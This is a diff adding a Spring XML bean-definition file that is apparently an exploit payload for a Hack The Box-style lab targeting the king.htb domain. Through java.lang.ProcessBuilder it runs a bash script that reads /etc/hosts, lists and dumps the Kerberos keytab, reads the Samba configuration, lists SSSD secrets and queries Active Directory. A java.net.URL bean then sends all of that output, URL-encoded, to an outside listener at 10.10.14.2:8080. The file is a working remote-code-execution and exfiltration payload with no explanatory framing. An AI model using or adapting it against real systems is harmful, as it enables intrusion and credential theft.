@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[
+DNS=$(nslookup openAD.king.htb 172.16.1.1 2>&1);
+HOSTS=$(cat /etc/hosts);
+KEYTAB=$(ls -la /etc/krb5.keytab /var/lib/sss/db/ 2>&1);
+KEYTAB_LIST=$(klist -kt /etc/krb5.keytab 2>&1 | head -20);
+SMB_CONF=$(cat /etc/samba/smb.conf 2>&1 | grep -v "^#\|^;" | grep -v "^$" | head -20);
+SECRETS=$(ls -la /var/lib/sss/secrets/ 2>&1);
+NET_ADS_NOAUTH=$(timeout 10 net ads user -S 172.16.1.1 2>&1 | head -20);
+echo "=DNS=$DNS=HOSTS=$HOSTS=KEYTAB=$KEYTAB=KTLIST=$KEYTAB_LIST=SMB=$SMB_CONF=SECRETS=$SECRETS=NETADS=$NET_ADS_NOAUTH"
+]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+    <bean id="proc" factory-bean="pb" factory-method="start"/>
+    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
+    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="procOut"/>
+    </bean>
+    <bean id="outStr" class="java.lang.String">
+        <constructor-arg ref="outBytes"/>
+    </bean>
+    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
+        <constructor-arg value="#{'http://10.10.14.2:8080/dnskt?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
+    </bean>
+    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
+</beans>
